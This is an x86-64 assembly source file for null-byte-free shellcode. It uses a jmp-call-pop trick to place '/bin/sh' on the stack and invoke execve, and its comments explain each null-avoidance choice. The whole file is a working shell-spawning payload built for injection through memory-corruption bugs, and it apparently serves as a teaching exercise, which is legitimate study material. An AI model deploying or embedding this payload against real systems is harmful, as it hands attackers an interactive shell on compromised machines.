section .text
;global _start
;_start:

  jmp   short two     ; 'jmp short' avoids null byte for shell code
                      ; also avoiding null bytes 
one:
  pop   rbx           ; address of data in rbx
  xor   rax, rax      ; rax = 0
  push  rax           ; 8 null bytes on the stach
  push  rax           ; another 8 null bytes on the stack
  mov   rax, [rbx]    ; 8 bytes of data in rax
  push  rax           ; now on the stack
  xor   rax, rax      ; rax = 0 (not about efficiency: avoid null bytes)
  mov   [rsp+7], al   ; Null terminate the string /bin/sh
  mov   [rsp+8], rsp  ; address of argv is rsp+8, argv[0] is rsp

  xor   rax, rax      ; avoiding 'mov rax, 59' because of null bytes
  mov   al, 59        ; sys_execve 64 bits (see /usr/include/asm/unistd_64.h)
  mov   rdi, rsp      ; filename
  lea   rsi, [rsp+8]  ; address of argv ('mov rsi, rsp+8' not valid assembly)
  lea   rdx, [rsp+16] ; address of envp ('mov rdx, rsp+16' not vald assembly)
  syscall             ; execve(filename, argv, envp)

two:                  ; cannot overwrite code segment, so will move data to stack
  call one            ; address of data now on the stack
  db "/bin/shX"       ; will be written to the stack, 'X' replaced by null byte
